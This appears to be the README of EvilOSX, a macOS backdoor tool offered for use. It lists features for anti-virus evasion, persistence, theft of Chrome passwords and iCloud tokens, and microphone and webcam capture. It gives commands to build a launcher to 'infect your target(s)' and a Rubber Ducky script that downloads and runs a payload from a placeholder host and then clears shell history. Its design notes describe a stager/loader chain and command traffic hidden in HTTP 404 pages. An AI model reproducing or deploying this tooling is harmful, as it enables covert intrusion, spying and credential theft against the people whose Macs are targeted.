Features
Emulate a terminal instance
Simple extendable module system
No bot dependencies (pure python)
Undetected by anti-virus (OpenSSL AES-256 encrypted payloads)
Persistent
GUI and CLI support
Retrieve Chrome passwords
Retrieve iCloud tokens and contacts

1/5

iTunes (iOS) backup enumeration
Record the microphone
Take a desktop screenshot or picture using the webcam
Attempt to get root via local privilege escalation

How To Use
# Clone or download this repository
$ git clone https://github.com/Marten4n6/EvilOSX
# Go into the repository
$ cd EvilOSX
# Install dependencies required by the server
$ sudo pip install -r requirements.txt
# Start the GUI
$ python start.py
# Lastly, run a built launcher on your target(s)

Warning: Because payloads are created unique to the target system (automatically by the
server), the server must be running when any bot connects for the first time.

Advanced users
There's also a CLI for those who want to use this over SSH:
# Create a launcher to infect your target(s)
$ python start.py --builder
# Start the CLI
$ python start.py --cli --port 1337
# Lastly, run a built launcher on your target(s)

Motivation
This project was created to be used with my Rubber Ducky, here's the simple script:
REM Download and execute EvilOSX @ https://github.com/Marten4n6/EvilOSX
REM See also: https://ducktoolkit.com/vidpid/
DELAY 1000
GUI SPACE
DELAY 500
STRING Termina
DELAY 1000
ENTER
DELAY 1500
REM Kill all terminals after x seconds
STRING screen -dm bash -c 'sleep 6; killall Terminal'
ENTER
STRING cd /tmp; curl -s HOST_TO_EVILOSX.py -o 1337.py; python 1337.py; history -cw;
clear
ENTER

It takes about 10 seconds to backdoor any unlocked Mac, which is...... nice
Terminal is spelt that way intentionally, on some systems spotlight won't find the
terminal otherwise.
To bypass the keyboard setup assistant make sure you change the VID&PID which can
be found here.
Aluminum Keyboard (ISO) is probably the one you are looking for.

Versioning
EvilOSX will be maintained under the Semantic Versioning guidelines as much as possible.
Server and bot releases will be numbered with the follow format:
<major>.<minor>.<patch>

And constructed with the following guidelines:
Breaking backward compatibility (with older bots) bumps the major
New additions without breaking backward compatibility bumps the minor
Bug fixes and misc changes bump the patch
For more information on SemVer, please visit https://semver.org/.

Design Notes

4/5

Infecting a machine is split up into three parts:
A launcher is run on the target machine whose only goal is to run the stager
The stager asks the server for a loader which handles how a payload will be
loaded
The loader is given a uniquely encrypted payload and then sent back to the
stager
The server hides it's communications by sending messages hidden in HTTP 404 error
pages (from BlackHat's "Hiding In Plain Sight")
Command requests are retrieved from the server via a GET request
Command responses are sent to the server via a POST request
Modules take advantage of python's dynamic nature, they are simply sent over the
network compressed with zlib, along with any configuration options
Since the bot only communicates with the server and never the other way around, the
server has no way of knowing when a bot goes offline
